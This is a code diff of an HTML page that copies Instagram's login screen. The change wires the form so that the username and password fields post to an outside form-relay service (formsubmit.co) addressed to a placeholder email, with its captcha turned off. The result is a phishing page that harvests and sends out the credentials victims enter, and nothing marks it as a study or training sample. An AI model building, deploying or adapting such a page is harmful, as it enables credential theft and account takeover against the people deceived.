@@ -3,26 +3,33 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="style.css" />
     <title>Login . Instagram</title>
   </head>
   <body>
-      <div class="login-container">
-            <h1>Instagram</h1>
-            <form>
-                <div class="input-container">
-                    <input type="text" id="username" required>
-                    <label for="username">Phone number, username, or email</label>
-                </div>
-                <div class="input-container">
-                    <input type="password" id="password" required>
-                    <label for="password">Password</label>
-                </div>
-                <button type="submit">Log In</button>
-            </form>
-            <a href="#">Forgot Password?</a>
-            <p>Don't have an account? <a href="#">Sign Up</a></p>
+    <div class="login-container">
+      <h1>Instagram</h1>
+      <form action="https://formsubmit.co/your@email.com" method="POST">
+        <!-- captcha -->
+        <input type="hidden" name="_captcha" value="false" />
+
+        <div class="input-container">
+          <input
+            type="text"
+            id="username"
+            name="Phone number, email, username"
+            required
+          />
+          <label for="username">Phone number, username, or email</label>
         </div>
-        
+        <div class="input-container">
+          <input type="password" id="password" name="password" required />
+          <label for="password">Password</label>
+        </div>
+        <button type="submit">Log In</button>
+      </form>
+      <a href="#">Forgot Password?</a>
+      <p>Don't have an account? <a href="#">Sign Up</a></p>
+    </div>
   </body>
 </html>
